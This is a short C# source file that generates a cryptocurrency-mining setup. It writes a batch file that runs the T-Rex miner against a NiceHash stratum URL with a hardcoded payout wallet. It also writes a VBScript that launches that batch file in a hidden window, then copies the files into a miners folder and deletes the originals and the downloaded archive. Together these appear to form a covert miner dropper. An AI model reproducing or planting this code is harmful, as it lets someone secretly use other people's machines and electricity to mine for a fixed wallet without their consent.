using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ProjectLibray
{
    public static class FileCreate
    {
        public static string FolderPath = "Miners";
        public static void Save_settings()
        {
            string Algorythm = "eth";
            string Stratum = "stratum+tcp://daggerhashimoto.eu.nicehash.com:3353";
            string Adress = "3JHpe1fpCiUKy6MwWcF6ocDiQRDFiFaNrx";
            string Username = "PC";
            string pass = "x";

            using (StreamWriter sw = File.CreateText(Algorythm + "-Auto.bat"))
            {
                sw.WriteLine("t-rex.exe " + "--algo " + Algorythm + " --url " + Stratum + " --user " + Adress + "." + Username + " --pass " + pass);
                sw.WriteLine("pause");
            }
            using (StreamWriter silent = File.CreateText("Start.vbs"))
            {
                silent.WriteLine("Set WshShell = CreateObject(\"WScript.Shell\")");
                silent.WriteLine("WshShell.Run chr(34) & " + Algorythm + " \"-Auto.bat\" & Chr(34), 0");
                silent.WriteLine("Set WshShell = Nothing");
            }

            if (!(File.Exists(FolderPath + "\\trex\\" + Algorythm + "-Auto.bat")))
            {
                File.Copy(Algorythm + "-Auto.bat", FolderPath + "\\trex\\" + Algorythm + "-Auto.bat");
                File.Copy("Start.vbs", FolderPath + "\\trex\\" + "Start.vbs");
                File.Delete("Start.vbs");
                File.Delete(Algorythm + "-Auto.bat");
                File.Delete(FolderPath + "\\t-rex.zip");
            }
        }
    }
}
